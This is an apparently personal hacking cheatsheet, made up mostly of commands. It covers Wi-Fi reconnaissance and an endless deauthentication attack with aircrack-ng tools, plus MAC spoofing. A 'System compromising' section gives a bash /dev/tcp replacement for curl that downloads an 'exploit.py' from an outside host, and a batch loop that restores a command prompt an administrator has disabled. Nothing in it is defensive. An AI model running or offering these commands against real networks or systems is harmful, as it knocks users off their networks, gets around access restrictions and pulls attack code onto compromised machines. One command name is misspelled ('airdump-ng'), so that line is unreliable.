# Useful Cheatsheet

## Networking stuff

### Show my wireless card name
```
iwconfig
```

### Put wireless card on monitor mode
```
airmon-ng start {card name}
```

### Show routers in range
```
airdump-ng {card name}
```
- PWR column is showing signal strenght
- Note also the channel and BSSID of the router

### Show devices connected to a specific router
```
airodump-ng {card name} --bssid {router BSSID} --channel {router channel}
```
- router is also included there

### Create deauth attack
```
aireplay-ng --deauth 0 -c {devices MAC} -a {routers MAC ADDRESS} {card name}
```
- possibility to include more routers and more MAC adresses
- 0 means infinite number of deauth messages
- TIP of the day: put for example 50 insted of 0 and replay it with 1 second delay

### Change MAC address
```
sudo ifconfig {interface} down
sudo ifconfig {interface} hw ether {MAC address}
sudo ifconfig {interface} up
```

### Host DarkWeb, Secret chat
- use onionshare

## System compromising

### curl or wget without the function itself
```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
 
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
 
 
# USAGE: __curl http://www.example.com/exploit.py > sploitz.py
```
### Get cmd in Windows if not enabled by administrator
- Create a file `something.bat` with following content
```
@echo off
:a
Set /p comm=cmd~
%comm%
Goto a
```
